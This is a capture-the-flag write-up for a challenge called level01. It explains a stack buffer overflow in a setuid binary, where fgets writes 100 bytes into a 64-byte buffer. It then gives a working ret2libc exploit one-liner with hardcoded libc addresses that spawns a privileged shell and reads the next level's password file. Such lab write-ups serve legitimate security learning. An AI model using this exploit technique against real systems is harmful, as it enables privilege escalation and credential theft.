# level01

## Objective

Exploit the setuid `level01` binary to obtain a shell with `level02` effective
permissions and read `/home/users/level02/.pass`.

## Vulnerability

`main` stores the password in a 64-byte local buffer but calls:

```c
fgets(password, 100, stdin);
```

`fgets` can therefore write up to 99 input bytes plus a NUL terminator into a
64-byte object. GDB measured the saved return address at offset 80 from the
start of that buffer.

The username must begin with `dat_wil`, because `verify_user_name` compares its
first seven bytes. The password check compares the first five bytes with
`admin`; the overflow begins with `A`, so the comparison is nonzero. Although
the program prints `nope, incorrect password...`, it subsequently returns
through the overwritten saved return address.

## Address discovery

The supplied VM has ASLR disabled:

```sh
cat /proc/sys/kernel/randomize_va_space
```

```text
0
```

In GDB, after starting the process, the relevant libc addresses were:

```gdb
p (void *) system
# 0xf7e6aed0
p (void *) exit
# 0xf7e5eb70
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
# 0xf7f897ec
```

Because ASLR is disabled, those addresses are stable for a normal execution of
the challenge binary on this VM.

## Exploit

The overwritten stack frame is a 32-bit ret2libc call:

```text
80 padding bytes | system | exit | address of "/bin/sh"
```

Run the following from the `level01` home directory:

```sh
(python -c 'import struct; print "dat_wil"; print "A"*80 + struct.pack("<I", 0xf7e6aed0) + struct.pack("<I", 0xf7e5eb70) + struct.pack("<I", 0xf7f897ec)'; cat) | ./level01
```

The first line satisfies the username check. The second line overwrites the
saved return address with `system`, places `exit` as its return address, and
places the libc `/bin/sh` string where `system` expects its first argument.
The trailing `cat` keeps standard input connected to the spawned shell.

Verify the privilege transition and recover the next password:

```sh
id
cat /home/users/level02/.pass
```

Observed identity:

```text
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users)
```

The recovered level02 password is recorded in `flag`.